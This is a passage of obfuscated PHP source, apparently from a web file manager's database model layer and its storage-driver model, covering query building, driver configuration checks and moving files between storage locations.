$fÂÅİï®ø; case $b“¤Ö©‰­[335]: $FÁ™°çÕ¹ = mb_strlen($CÔŠ”ÈÜ°‚, $b“¤Ö©‰­[336]); if (strpos($fÂÅİï®ø, $b“¤Ö©‰­[47])) { list($A§©´®ÏèÚ, $cÜ”¿ôÛ¥ë) = explode($b“¤Ö©‰­[47], $fÂÅİï®ø); return $FÁ™°çÕ¹ >= $A§©´®ÏèÚ && $FÁ™°çÕ¹ <= $cÜ”¿ôÛ¥ë; } else { return $FÁ™°çÕ¹ == $fÂÅİï®ø; } case $b“¤Ö©‰­[337]: list($E¤µÄ’‹‡é, $d¾­øĞÑÀä) = explode($b“¤Ö©‰­[47], $fÂÅİï®ø); if (!is_numeric($E¤µÄ’‹‡é)) { $E¤µÄ’‹‡é = strtotime($E¤µÄ’‹‡é); } if (!is_numeric($d¾­øĞÑÀä)) { $d¾­øĞÑÀä = strtotime($d¾­øĞÑÀä); } return NOW_TIME >= $E¤µÄ’‹‡é && NOW_TIME <= $d¾­øĞÑÀä; case $b“¤Ö©‰­[338]: return in_array(get_client_ip(), explode($b“¤Ö©‰­[47], $fÂÅİï®ø)); case $b“¤Ö©‰­[339]: return !in_array(get_client_ip(), explode($b“¤Ö©‰­[47], $fÂÅİï®ø)); case $b“¤Ö©‰­[326]: default: return $this->regex($CÔŠ”ÈÜ°‚, $fÂÅİï®ø); } } public function query($d°¯›”šƒ, $fÊ’÷Ûá = false) { $bï”İ‡¹ªª =& $_SERVER[ä°„ä°º]; if (!is_bool($fÊ’÷Ûá) && !is_array($fÊ’÷Ûá)) { $fÊ’÷Ûá = func_get_args(); array_shift($fÊ’÷Ûá); } $d°¯›”šƒ = str_replace(array($bï”İ‡¹ªª[229], $bï”İ‡¹ªª[340]), $bï”İ‡¹ªª[50], $d°¯›”šƒ); $d°¯›”šƒ = $this->parseSql($d°¯›”šƒ, $fÊ’÷Ûá); return $this->db->query($d°¯›”šƒ); } public function execute($díì·Öƒ­è, $b‡‡äî›¹§ = false) { if (!is_bool($b‡‡äî›¹§) && !is_array($b‡‡äî›¹§)) { $b‡‡äî›¹§ = func_get_args(); array_shift($b‡‡äî›¹§); } $díì·Öƒ­è = $this->parseSql($díì·Öƒ­è, $b‡‡äî›¹§); return $this->db->execute($díì·Öƒ­è); } protected function parseSql($F®ÖÇŠªà, $cƒÏØ¿ÑÁ) { $bĞÉœ„‹öª =& $_SERVER[ä°„ä°º]; if (!0 === $cƒÏØ¿ÑÁ) { $BÍ…‹ÉÑŒÔ = $this->_parseOptions(); $F®ÖÇŠªà = $this->db->parseSql($F®ÖÇŠªà, $BÍ…‹ÉÑŒÔ); } elseif (is_array($cƒÏØ¿ÑÁ)) { $cƒÏØ¿ÑÁ = array_map(array($this->db, $bĞÉœ„‹öª[341]), $cƒÏØ¿ÑÁ); $F®ÖÇŠªà = vsprintf($F®ÖÇŠªà, $cƒÏØ¿ÑÁ); } else { $F®ÖÇŠªà = strtr($F®ÖÇŠªà, array($bĞÉœ„‹öª[342] => $this->getTableName(), $bĞÉœ„‹öª[343] => think_config($bĞÉœ„‹öª[242]))); } $this->db->setModel($this->name); return $F®ÖÇŠªà; } public function db($DÎ°ä¯Œ…Á = '', $B×½ôÊ•ñ = '', $D¼ÂÛ¹ÌÒŠ = array()) { goto D¼Î„ùÕŠ; A’Ù·á‘ËÙ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto dš±Ô˜æŠ÷; BøŠ‚³Ñ­å: $fƒØ¨Äê¬¤[$DÎ°ä¯Œ…Á] = $B×½ôÊ•ñ; $this->db = $Eí­Ôğ¬î[$DÎ°ä¯Œ…Á]; $this->_after_db(); goto A’Ù·á‘ËÙ; D¼Î„ùÕŠ: $FØò†ÂğŞ =& $_SERVER[ä°„ä°º]; if ($FØò†ÂğŞ[33] === $DÎ°ä¯Œ…Á && $this->db) { return $this->db; } static $fƒØ¨Äê¬¤ = array(); goto b£„Û‰µ¸‘; b£„Û‰µ¸‘: static $Eí­Ôğ¬î = array(); if (!isset($Eí­Ôğ¬î[$DÎ°ä¯Œ…Á]) || isset($Eí­Ôğ¬î[$DÎ°ä¯Œ…Á]) && $B×½ôÊ•ñ && $fƒØ¨Äê¬¤[$DÎ°ä¯Œ…Á] != $B×½ôÊ•ñ) { if (!empty($B×½ôÊ•ñ) && is_string($B×½ôÊ•ñ) && !1 === strpos($B×½ôÊ•ñ, $FØò†ÂğŞ[8])) { $B×½ôÊ•ñ = think_config($B×½ôÊ•ñ); } $Eí­Ôğ¬î[$DÎ°ä¯Œ…Á] = Db::getInstance($B×½ôÊ•ñ); } elseif (NULL === $B×½ôÊ•ñ) { $Eí­Ôğ¬î[$DÎ°ä¯Œ…Á]->close(); unset($Eí­Ôğ¬î[$DÎ°ä¯Œ…Á]); return; } if (!empty($D¼ÂÛ¹ÌÒŠ)) { if (is_string($D¼ÂÛ¹ÌÒŠ)) { parse_str($D¼ÂÛ¹ÌÒŠ, $D¼ÂÛ¹ÌÒŠ); } foreach ($D¼ÂÛ¹ÌÒŠ as $D‰˜ôŠÒò† => $Fù™Î”»òî) { $this->setProperty($D‰˜ôŠÒò†, $Fù™Î”»òî); } } goto BøŠ‚³Ñ­å; dš±Ô˜æŠ÷: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Cã¼ÚŒí§ô = get_class($this); if ($Cã¼ÚŒí§ô == $_SERVER[ä°„ä°º][344]) { return $this->name; } $this->name = substr($Cã¼ÚŒí§ô, 0, -5); } return $this->name; } public function getTableName() { $f¼®§àŠÁß =& $_SERVER[ä°„ä°º]; if (empty($this->trueTableName)) { $d“œ°µ‹‰Œ = !empty($this->tablePrefix) ? $this->tablePrefix : $f¼®§àŠÁß[33]; if (!empty($this->tableName)) { $d“œ°µ‹‰Œ .= $this->tableName; } else { $d“œ°µ‹‰Œ .= think_parse_name($this->name); } $this->trueTableName = strtolower($d“œ°µ‹‰Œ); } return (!empty($this->dbName) ? $this->dbName . $f¼®§àŠÁß[95] : $f¼®§àŠÁß[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Fëó¼¼Ï =& $_SERVER[ä°„ä°º]; return isset($this->fields[$Fëó¼¼Ï[249]]) ? $this->fields[$Fëó¼¼Ï[249]] : $this->pk; } public function getDbFields() { $Bîç¹ê®¤Û =& $_SERVER[ä°„ä°º]; if (isset($this->options[$Bîç¹ê®¤Û[277]])) { $Cº×Ûö›Ÿ = $this->db->getFields($this->options[$Bîç¹ê®¤Û[277]]); return $Cº×Ûö›Ÿ ? array_keys($Cº×Ûö›Ÿ) : !1; } if ($this->fields) { $Cº×Ûö›Ÿ = $this->fields; unset($Cº×Ûö›Ÿ[$Bîç¹ê®¤Û[248]], $Cº×Ûö›Ÿ[$Bîç¹ê®¤Û[249]], $Cº×Ûö›Ÿ[$Bîç¹ê®¤Û[250]], $Cº×Ûö›Ÿ[$Bîç¹ê®¤Û[247]]); return $Cº×Ûö›Ÿ; } return !1; } public function data($e†àìªó ‰ = '') { $cÛŸÅ“¾ÎØ =& $_SERVER[ä°„ä°º]; if ($cÛŸÅ“¾ÎØ[33] === $e†àìªó ‰ && !empty($this->data)) { return $this->data; } if (is_object($e†àìªó ‰)) { $e†àìªó ‰ = get_object_vars($e†àìªó ‰); } elseif (is_string($e†àìªó ‰)) { parse_str($e†àìªó ‰, $e†àìªó ‰); } elseif (!is_array($e†àìªó ‰)) { think_exception(think_lang($cÛŸÅ“¾ÎØ[269])); } $this->data = $e†àìªó ‰; return $this; } public function join($b³´Èùƒ¾) { $F±Ïˆ¦¦ =& $_SERVER[ä°„ä°º]; if (is_array($b³´Èùƒ¾)) { $this->options[$F±Ïˆ¦¦[280]] = $b³´Èùƒ¾; } elseif (!empty($b³´Èùƒ¾)) { $this->options[$F±Ïˆ¦¦[280]][] = $b³´Èùƒ¾; } return $this; } public function union($C±µÂˆÒø”, $eÁÈŸİÜ£ = false) { goto F‹ğò©Œ°; Bë¢é†Ø·’: return $this; goto d¢¡ÄŒÇ„Í; F‹ğò©Œ°: $EÃ¶¸õ÷ëš =& $_SERVER[ä°„ä°º]; if (empty($C±µÂˆÒø”)) { return $this; } if ($eÁÈŸİÜ£) { $this->options[$EÃ¶¸õ÷ëš[345]][$EÃ¶¸õ÷ëš[346]] = !0; } goto F¬ƒ–ÜŸº; F¬ƒ–ÜŸº: if (is_object($C±µÂˆÒø”)) { $C±µÂˆÒø” = get_object_vars($C±µÂˆÒø”); } if (is_string($C±µÂˆÒø”)) { $Céñ¸ = $C±µÂˆÒø”; } elseif (is_array($C±µÂˆÒø”)) { if (isset($C±µÂˆÒø”[0])) { $this->options[$EÃ¶¸õ÷ëš[345]] = array_merge($this->options[$EÃ¶¸õ÷ëš[345]], $C±µÂˆÒø”); return $this; } else { $Céñ¸ = $C±µÂˆÒø”; } } else { think_exception(think_lang($EÃ¶¸õ÷ëš[269])); } $this->options[$EÃ¶¸õ÷ëš[345]][] = $Céñ¸; goto Bë¢é†Ø·’; d¢¡ÄŒÇ„Í: } public function cache($Cæ†ÕÑñ = true, $EëñÁ‰ùÌ = null, $c•ššÄ»‘Ô = '') { $dÊí•••ºÂ =& $_SERVER[ä°„ä°º]; if (!1 !== $Cæ†ÕÑñ) { $this->options[$dÊí•••ºÂ[347]] = array($dÊí•••ºÂ[93] => $Cæ†ÕÑñ, $dÊí•••ºÂ[337] => $EëñÁ‰ùÌ, $dÊí•••ºÂ[29] => $c•ššÄ»‘Ô); } return $this; } public function field($aÌ¢¾ ØŒ¬, $fÕ‡ğ”ò¹ = false) { $DÊ’ƒ‡è…‚ =& $_SERVER[ä°„ä°º]; if (!0 === $aÌ¢¾ ØŒ¬) { $eªÌÌ«ö«Ó = $this->getDbFields(); $aÌ¢¾ ØŒ¬ = $eªÌÌ«ö«Ó ? $eªÌÌ«ö«Ó : $DÊ’ƒ‡è…‚[182]; } elseif ($fÕ‡ğ”ò¹) { if (is_string($aÌ¢¾ ØŒ¬)) { $aÌ¢¾ ØŒ¬ = explode($DÊ’ƒ‡è…‚[47], $aÌ¢¾ ØŒ¬); } $eªÌÌ«ö«Ó = $this->getDbFields(); $aÌ¢¾ ØŒ¬ = $eªÌÌ«ö«Ó ? array_diff($eªÌÌ«ö«Ó, $aÌ¢¾ ØŒ¬) : $aÌ¢¾ ØŒ¬; } $this->options[$DÊ’ƒ‡è…‚[271]] = $aÌ¢¾ ØŒ¬; return $this; } public function scope($f¶¸¬Â¨ß¬ = '', $a°‹³²•’ = NULL) { $EÅÒšÖ†ì =& $_SERVER[ä°„ä°º]; if ($EÅÒšÖ†ì[33] === $f¶¸¬Â¨ß¬) { if (isset($this->_scope[$EÅÒšÖ†ì[34]])) { $DñÅ£Êˆì‰ = $this->_scope[$EÅÒšÖ†ì[34]]; } else { return $this; } } elseif (is_string($f¶¸¬Â¨ß¬)) { $BÌ•Ûƒ¡ù… = explode($EÅÒšÖ†ì[47], $f¶¸¬Â¨ß¬); $DñÅ£Êˆì‰ = array(); foreach ($BÌ•Ûƒ¡ù… as $E†¡¡®Àó) { if (!isset($this->_scope[$E†¡¡®Àó])) { continue; } $DñÅ£Êˆì‰ = array_merge($DñÅ£Êˆì‰, $this->_scope[$E†¡¡®Àó]); } if (!empty($a°‹³²•’) && is_array($a°‹³²•’)) { $DñÅ£Êˆì‰ = array_merge($DñÅ£Êˆì‰, $a°‹³²•’); } } elseif (is_array($f¶¸¬Â¨ß¬)) { $DñÅ£Êˆì‰ = $f¶¸¬Â¨ß¬; } if (is_array($DñÅ£Êˆì‰) && !empty($DñÅ£Êˆì‰)) { $this->options = array_merge($this->options, array_change_key_case($DñÅ£Êˆì‰)); } return $this; } public function where($C°„ğïÕ²”, $E¶®Ò†à²è = null) { $AÂ˜ÃÆ¬ =& $_SERVER[ä°„ä°º]; if (!is_null($E¶®Ò†à²è) && is_string($C°„ğïÕ²”)) { if (!is_array($E¶®Ò†à²è)) { $E¶®Ò†à²è = func_get_args(); array_shift($E¶®Ò†à²è); } $E¶®Ò†à²è = array_map(array($this->db, $AÂ˜ÃÆ¬[341]), $E¶®Ò†à²è); $C°„ğïÕ²” = vsprintf($C°„ğïÕ²”, $E¶®Ò†à²è); } elseif (is_object($C°„ğïÕ²”)) { $C°„ğïÕ²” = get_object_vars($C°„ğïÕ²”); } elseif (is_array($C°„ğïÕ²”)) { foreach ($C°„ğïÕ²” as $D²ˆ¢Ö•âµ => $Bµ¦‡ùšÔ¶) { if ((is_numeric($D²ˆ¢Ö•âµ) || !$D²ˆ¢Ö•âµ) && is_string($Bµ¦‡ùšÔ¶)) { if (strpos($Bµ¦‡ùšÔ¶, $AÂ˜ÃÆ¬[348]) === 0) { continue; } think_trace($AÂ˜ÃÆ¬[349], $AÂ˜ÃÆ¬[33], $AÂ˜ÃÆ¬[46]); die; } } } if (is_string($C°„ğïÕ²”) && $AÂ˜ÃÆ¬[33] != $C°„ğïÕ²”) { $B‹·ÎÃÖ×Ì = array(); $B‹·ÎÃÖ×Ì[$AÂ˜ÃÆ¬[350]] = $C°„ğïÕ²”; $C°„ğïÕ²” = $B‹·ÎÃÖ×Ì; } if (isset($this->options[$AÂ˜ÃÆ¬[273]])) { $this->options[$AÂ˜ÃÆ¬[273]] = array_merge($this->options[$AÂ˜ÃÆ¬[273]], $C°„ğïÕ²”); } else { $this->options[$AÂ˜ÃÆ¬[273]] = $C°„ğïÕ²”; } return $this; } public function limit($c¦ÏÒ·ÆåÈ, $B³ù•‘Å’ = null) { $eŠõÙ´ñ¶Ó =& $_SERVER[ä°„ä°º]; $this->options[$eŠõÙ´ñ¶Ó[290]] = is_null($B³ù•‘Å’) ? $c¦ÏÒ·ÆåÈ : $c¦ÏÒ·ÆåÈ . $eŠõÙ´ñ¶Ó[47] . $B³ù•‘Å’; return $this; } public function page($B„Ø®½²İ“, $CİÏÁ ‘õ« = null) { $aÖ¶ç¡–‰¤ =& $_SERVER[ä°„ä°º]; $this->options[$aÖ¶ç¡–‰¤[351]] = is_null($CİÏÁ ‘õ«) ? $B„Ø®½²İ“ : $B„Ø®½²İ“ . $aÖ¶ç¡–‰¤[47] . $CİÏÁ ‘õ«; return $this; } public function comment($fÓº à‚Èé) { $this->options[$_SERVER[ä°„ä°º][352]] = $fÓº à‚Èé; return $this; } public function setProperty($eºšŸ‰ŠÀ, $f´ˆÖ°ô¾) { if (property_exists($this, $eºšŸ‰ŠÀ)) { $this->{$eºšŸ‰ŠÀ} = $f´ˆÖ°ô¾; } return $this; } } goto bÛ´Èœçİ÷; Aõ«—¼«­„: class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\x2e\x73\164\157\x72\x61\x67\x65\x4c\151\163\x74"; public $field = array("\156\x61\155\x65", "\x73\x69\x7a\145\x4d\x61\x78", "\x73\171\163\164\145\x6d", "\x64\x65\x66\141\165\154\x74", "\144\162\151\166\x65\162", "\x63\x6f\x6e\146\x69\x67"); public function listData($EŒ§¢¼ = false, $bÙØäßó‰‚ = "\x6d\x6f\144\x69\x66\171\124\151\x6d\x65", $bï¾•ÃøÎŸ = false) { $dõë˜†ºåà =& $_SERVER[ä°„ä°º]; $E§‡ˆ®Û™ç = parent::listData($EŒ§¢¼, $bÙØäßó‰‚, $bï¾•ÃøÎŸ); if ($EŒ§¢¼) { return $E§‡ˆ®Û™ç; } $Cè”ÛÌ“Æê = $this->ioSizeUseGet(array_to_keyvalue($E§‡ˆ®Û™ç, $dõë˜†ºåà[33], $dõë˜†ºåà[393])); foreach ($E§‡ˆ®Û™ç as $bÕƒ¢”‚÷ => $BÎèãˆÄÛ·) { unset($E§‡ˆ®Û™ç[$bÕƒ¢”‚÷][$dõë˜†ºåà[6]]); $E§‡ˆ®Û™ç[$bÕƒ¢”‚÷][$dõë˜†ºåà[1706]] = isset($Cè”ÛÌ“Æê[$BÎèãˆÄÛ·[$dõë˜†ºåà[393]]]) ? $Cè”ÛÌ“Æê[$BÎèãˆÄÛ·[$dõë˜†ºåà[393]]] : 0; } return $E§‡ˆ®Û™ç; } public function ioSizeUseGet($Bê‹ÓÊµÚ‹) { goto AÃ•®ÜÀ¹ ; A¿°¹ÇËÁô: $dİ‚çñ»Üù = array($BñÔÈ®†—Ç[805] => array($BñÔÈ®†—Ç[7], $Bê‹ÓÊµÚ‹)); $Báåø³Éñ = Model($BñÔÈ®†—Ç[770])->field($Aö±ª¡”³Î)->where($dİ‚çñ»Üù)->group($BñÔÈ®†—Ç[805])->select(); $Báåø³Éñ = array_to_keyvalue($Báåø³Éñ, $BñÔÈ®†—Ç[393], $BñÔÈ®†—Ç[78]); goto E¤®®’†áÊ; E¤®®’†áÊ: Cache::set($FÕŒåöÈÃ, $Báåø³Éñ, 600); return $Báåø³Éñ; goto dÚ¬î¾ÃÒ; AÃ•®ÜÀ¹ : $BñÔÈ®†—Ç =& $_SERVER[ä°„ä°º]; if (!$Bê‹ÓÊµÚ‹) { return array(); } $FÕŒåöÈÃ = $BñÔÈ®†—Ç[2018] . implode($BñÔÈ®†—Ç[47], $Bê‹ÓÊµÚ‹); goto AÆ®ò½ÎÏ; AÆ®ò½ÎÏ: $Báåø³Éñ = Cache::get($FÕŒåöÈÃ); if ($Báåø³Éñ) { return $Báåø³Éñ; } $Aö±ª¡”³Î = array($BñÔÈ®†—Ç[805] => $BñÔÈ®†—Ç[393], $BñÔÈ®†—Ç[2019] => $BñÔÈ®†—Ç[78]); goto A¿°¹ÇËÁô; dÚ¬î¾ÃÒ: } public function getConfig($C™çÒ«‘æ) { $cÔ©§¹åáÊ = parent::listData($C™çÒ«‘æ); return json_decode($cÔ©§¹åáÊ[$_SERVER[ä°„ä°º][6]], !0); } public function update($eñÎƒÜØ”, $DªŠÈÍéÕ’) { goto d£È§·ƒØ“; d£È§·ƒØ“: $CºÁ…ï•ÎÔ =& $_SERVER[ä°„ä°º]; $EÑØ´ªå¾• = $DªŠÈÍéÕ’[$CºÁ…ï•ÎÔ[28]]; $BâŒùÁù = array_to_keyvalue(parent::listData(), $CºÁ…ï•ÎÔ[28]); goto aä¨Ñ§ÆÑ; aä¨Ñ§ÆÑ: if (isset($BâŒùÁù[$EÑØ´ªå¾•]) && $BâŒùÁù[$EÑØ´ªå¾•][$CºÁ…ï•ÎÔ[393]] != $eñÎƒÜØ”) { return !1; } if (isset($DªŠÈÍéÕ’[$CºÁ…ï•ÎÔ[2020]]) && $DªŠÈÍéÕ’[$CºÁ…ï•ÎÔ[2020]] == $CºÁ…ï•ÎÔ[87]) { $this->checkConfig($DªŠÈÍéÕ’); } unset($DªŠÈÍéÕ’[$CºÁ…ï•ÎÔ[2020]]); goto f¦±¾‚£Ÿ; f¦±¾‚£Ÿ: $DÑ³¶…‚¶ì = parent::update($eñÎƒÜØ”, $DªŠÈÍéÕ’); if ($DÑ³¶…‚¶ì && $DªŠÈÍéÕ’[$CºÁ…ï•ÎÔ[34]]) { foreach ($BâŒùÁù as $DãáöÂ‡›ç) { if ($DãáöÂ‡›ç[$CºÁ…ï•ÎÔ[34]] && $DãáöÂ‡›ç[$CºÁ…ï•ÎÔ[393]] != $eñÎƒÜØ”) { parent::update($DãáöÂ‡›ç[$CºÁ…ï•ÎÔ[393]], array($CºÁ…ï•ÎÔ[34] => 0)); } } } return $DÑ³¶…‚¶ì; goto c¨Ì½§‹¥¥; c¨Ì½§‹¥¥: } public function add($d•ÙÀ’Ğó) { goto E±„‹©ªá; E…±Ü­“õ: return $EŠƒ¿£¾İ©; goto BÜ•–à—‰±; E±„‹©ªá: $AÒµÙæ©Ò =& $_SERVER[ä°„ä°º]; $Bµ®¦á‘ö‰ = array_to_keyvalue(parent::listData(), $AÒµÙæ©Ò[28]); if (isset($Bµ®¦á‘ö‰[$d•ÙÀ’Ğó[$AÒµÙæ©Ò[28]]])) { return !1; } goto cˆî‡›ìïç; cˆî‡›ìïç: $this->checkConfig($d•ÙÀ’Ğó); $EŠƒ¿£¾İ© = parent::insert($d•ÙÀ’Ğó); if ($EŠƒ¿£¾İ© && $d•ÙÀ’Ğó[$AÒµÙæ©Ò[34]]) { foreach ($Bµ®¦á‘ö‰ as $dÇ”²‰ñØˆ) { if ($dÇ”²‰ñØˆ[$AÒµÙæ©Ò[34]]) { parent::update($dÇ”²‰ñØˆ[$AÒµÙæ©Ò[393]], array($AÒµÙæ©Ò[34] => 0)); } } } goto E…±Ü­“õ; BÜ•–à—‰±: } public function checkConfig(&$C±íÓ±÷”, $eÍƒ¸¸Ã„ = false) { goto BËĞçÒéôÀ; CãéÌâñè: $C±íÓ±÷”[$dÀêóÊˆš®[6]] = json_encode($B¾®±Î­¶ö); $C±íÓ±÷”[$dÀêóÊˆš®[94]] = $Cé™Çèèƒí; return !0; goto F¥—„Ç—Ù; B¯Ùóªø…Ñ: $Cé™Çèèƒí = isset($E·ì¶„¦ÖÎ[$föî¿™õÓ–]) ? $E·ì¶„¦ÖÎ[$föî¿™õÓ–] : ucfirst($föî¿™õÓ–); $EŠîôä¿˜ = $dÀêóÊˆš®[72] . $Cé™Çèèƒí; if (!$Cé™Çèèƒí || !class_exists($EŠîôä¿˜)) { if ($eÍƒ¸¸Ã„) { return LNG($dÀêóÊˆš®[2022]); } write_log(array($dÀêóÊˆš®[2023], $C±íÓ±÷”, get_caller_info()), $dÀêóÊˆš®[2024]); show_json(LNG($dÀêóÊˆš®[2022]), !1, $C±íÓ±÷”); } goto cÄ…ğÒÏ¦ç; BËĞçÒéôÀ: $dÀêóÊˆš® =& $_SERVER[ä°„ä°º]; $föî¿™õÓ– = strtolower($C±íÓ±÷”[$dÀêóÊˆš®[94]]); $B¾®±Î­¶ö = json_decode($C±íÓ±÷”[$dÀêóÊˆš®[6]], !0); goto cÔØƒÕÔçë; cÔØƒÕÔçë: foreach ($B¾®±Î­¶ö as $cÌ¥…µ¥ºÂ => $A²‘Ö®î‘‘) { $B¾®±Î­¶ö[$cÌ¥…µ¥ºÂ] = trim($A²‘Ö®î‘‘); } $B¾®±Î­¶ö[$dÀêóÊˆš®[2021]] = rand_string(6); $E·ì¶„¦ÖÎ = $GLOBALS[$dÀêóÊˆš®[6]][$dÀêóÊˆš®[88]][$dÀêóÊˆš®[814]]; goto B¯Ùóªø…Ñ; cÄ…ğÒÏ¦ç: $Cã ù¢¡Ù¯ = new $EŠîôä¿˜($B¾®±Î­¶ö); if (in_array($föî¿™õÓ–, $Cã ù¢¡Ù¯->objectDriver)) { if (!$Cã ù¢¡Ù¯->isBucketCors() && !$Cã ù¢¡Ù¯->setBucketCors()) { $DŞÒ¿£Ú‡İ = LNG($dÀêóÊˆš®[2025]); $DŞÒ¿£Ú‡İ .= $dÀêóÊˆš®[2026] . LNG($dÀêóÊˆš®[2027]); if ($eÍƒ¸¸Ã„) { return $DŞÒ¿£Ú‡İ; } show_json($DŞÒ¿£Ú‡İ, !1); } } $c‚ÙöÚôÒ´ = rtrim($B¾®±Î­¶ö[$dÀêóÊˆš®[1097]], $dÀêóÊˆš®[8]) . $dÀêóÊˆš®[8]; goto fˆ˜õß‹ô®; fˆ˜õß‹ô®: $F¿µƒˆÛÕñ = $Cã ù¢¡Ù¯->getPath($c‚ÙöÚôÒ´ . $dÀêóÊˆš®[1159]); if (!$Cã ù¢¡Ù¯->mkfile($F¿µƒˆÛÕñ)) { if ($eÍƒ¸¸Ã„) { return LNG($dÀêóÊˆš®[2025]); } show_json(LNG($dÀêóÊˆš®[2025]), !1); } $B¾®±Î­¶ö[$dÀêóÊˆš®[1097]] = $c‚ÙöÚôÒ´; goto CãéÌâñè; F¥—„Ç—Ù: } public function driverListSystem() { $d‰†Šàì¼ =& $_SERVER[ä°„ä°º]; $C‚ß´Ô”¿Ê = parent::listData(); $Eîé©Ä¼Ô’ = array(); foreach ($C‚ß´Ô”¿Ê as $CŠİªñùêŒ) { unset($CŠİªñùêŒ[$d‰†Šàì¼[194]], $CŠİªñùêŒ[$d‰†Šàì¼[84]]); $CŠİªñùêŒ[$d‰†Šàì¼[6]] = json_decode($CŠİªñùêŒ[$d‰†Šàì¼[6]], !0); $Eîé©Ä¼Ô’[] = $CŠİªñùêŒ; } return $Eîé©Ä¼Ô’; } public function defaultDriver() { $B™ø‡Š¾× =& $_SERVER[ä°„ä°º]; $AÔºÚÆŒñ = parent::listData(); $Dµª¬áœÂ = array_filter_by_field($AÔºÚÆŒñ, $B™ø‡Š¾×[34], 1); $Dµª¬áœÂ = $Dµª¬áœÂ[0]; if ($Dµª¬áœÂ) { $Dµª¬áœÂ[$B™ø‡Š¾×[6]] = json_decode($Dµª¬áœÂ[$B™ø‡Š¾×[6]], !0); } return $Dµª¬áœÂ; } public function driverInfo($aŠÂô‰ï‘) { $F‘İ¾İæ¡ =& $_SERVER[ä°„ä°º]; $aç†Ô´ã–¦ = array_to_keyvalue(parent::listData(), $F‘İ¾İæ¡[393]); if (!isset($aç†Ô´ã–¦[$aŠÂô‰ï‘])) { return !1; } $C¶Ò»“·Ó‡ = $aç†Ô´ã–¦[$aŠÂô‰ï‘]; $C¶Ò»“·Ó‡[$F‘İ¾İæ¡[6]] = json_decode($C¶Ò»“·Ó‡[$F‘İ¾İæ¡[6]], !0); return $C¶Ò»“·Ó‡; } public function remove($F¶”íëœè») { $this->removeShareItems($F¶”íëœè»); return parent::remove($F¶”íëœè»); } public function removeWithFile($CÎç¹êÔßç, $AÏ§ÄÁØŸ³) { goto Eäæ„¼›Ö‰; EÜ‡É†¦£Ò: $fêÓµŸ£ÜÈ = "\173\151\157\72{$CĞÒÑ˜ŠÀÖ}\175\x2f"; $DËŸÃÔğ·â = !0; $E§¡ñ‹İ” = array(); goto BŠ±Šäµ¨; A­›ê†‹ƒ: if (!$DËŸÃÔğ·â) { $eèê‡œÕÔ->stop($BÉê¨‡Èõ); return !1; } $eèê‡œÕÔ->end(); if ($AÏ§ÄÁØŸ³ == $E«†™ù•ËÍ[1686]) { $this->remove($CÎç¹êÔßç); } goto Cóİˆ°œ É; Cº³“·¾Ê„: $c‡äš“¹–£ = Model($E«†™ù•ËÍ[450])->where($Eê¬ˆ¶âöˆ)->sum($E«†™ù•ËÍ[78]); $BÉê¨‡Èõ = $AÏ§ÄÁØŸ³ . $E«†™ù•ËÍ[2028] . $CÎç¹êÔßç; $eèê‡œÕÔ = new TaskFileTransfer($BÉê¨‡Èõ, $E«†™ù•ËÍ[2024], $dàÜÒËİ‡, LNG($E«†™ù•ËÍ[2029]) . "\50{$CÎç¹êÔßç}\x29"); goto FƒÎ¡ªŸñˆ; Eäæ„¼›Ö‰: $E«†™ù•ËÍ =& $_SERVER[ä°„ä°º]; $Eê¬ˆ¶âöˆ = array($E«†™ù•ËÍ[805] => $CÎç¹êÔßç); $dàÜÒËİ‡ = Model($E«†™ù•ËÍ[450])->where($Eê¬ˆ¶âöˆ)->count(); goto Cº³“·¾Ê„; FƒÎ¡ªŸñˆ: $eèê‡œÕÔ->task[$E«†™ù•ËÍ[746]] = (double) $c‡äš“¹–£; $EŒ±´×õó = KodIO::defaultDriver(); $CĞÒÑ˜ŠÀÖ = $EŒ±´×õó[$E«†™ù•ËÍ[393]]; goto EÜ‡É†¦£Ò; BŠ±Šäµ¨: $C¯Îóà±† = Model($E«†™ù•ËÍ[193])->where($Eê¬ˆ¶âöˆ)->field($E«†™ù•ËÍ[2030])->select(); foreach ($C¯Îóà±† as $dÉë‚ã…Í†) { goto F‚ÀÎÄ³ª; Fñ£œéÛ‚õ: $f´Ó˜öÆøƒ = array($E«†™ù•ËÍ[805] => $CĞÒÑ˜ŠÀÖ, $E«†™ù•ËÍ[76] => $f†©Í’¡Ï¡); Model($E«†™ù•ËÍ[193])->where($Eê¬ˆ¶âöˆ)->save($f´Ó˜öÆøƒ); goto bğ‚Ğœƒ¨­; AÎ—â•Ü…: if (IO::exist($f†©Í’¡Ï¡)) { $eèê‡œÕÔ->updateFileEnd($dÉë‚ã…Í†[$E«†™ù•ËÍ[28]], $dÉë‚ã…Í†[$E«†™ù•ËÍ[78]]); continue; } if (!IO::move($aí»äçÛµ—, get_path_father($f†©Í’¡Ï¡))) { $DËŸÃÔğ·â = !1; break; } $Eê¬ˆ¶âöˆ = array($E«†™ù•ËÍ[447] => $dÉë‚ã…Í†[$E«†™ù•ËÍ[447]]); goto Fñ£œéÛ‚õ; F‚ÀÎÄ³ª: $aí»äçÛµ— = $dÉë‚ã…Í†[$E«†™ù•ËÍ[76]]; $f†©Í’¡Ï¡ = $fêÓµŸ£ÜÈ . str_replace("\173\151\157\72{$CÎç¹êÔßç}\175\57", $E«†™ù•ËÍ[33], $aí»äçÛµ—); if (!IO::exist($aí»äçÛµ—)) { $E§¡ñ‹İ”[] = $dÉë‚ã…Í†[$E«†™ù•ËÍ[447]]; $eèê‡œÕÔ->updateFileEnd($dÉë‚ã…Í†[$E«†™ù•ËÍ[28]], $dÉë‚ã…Í†[$E«†™ù•ËÍ[78]]); continue; } goto AÎ—â•Ü…; bğ‚Ğœƒ¨­: } $this->removeByFileID($E§¡ñ‹İ”); goto A­›ê†‹ƒ; Cóİˆ°œ É: } public function progress($d¤ëÓíŒ»ó, $dÑ•¡‰’–±) { return Task::get($dÑ•¡‰’–± . $_SERVER[ä°„ä°º][2028] . $d¤ëÓíŒ»ó); } private function removeByFileID($F‚¬å¹ŠÊ = array()) { goto fß¡ãÈŸ; d ÷íÂå©Ù: foreach ($B«íÙ„¤ç as $BÙìĞÍšä) { 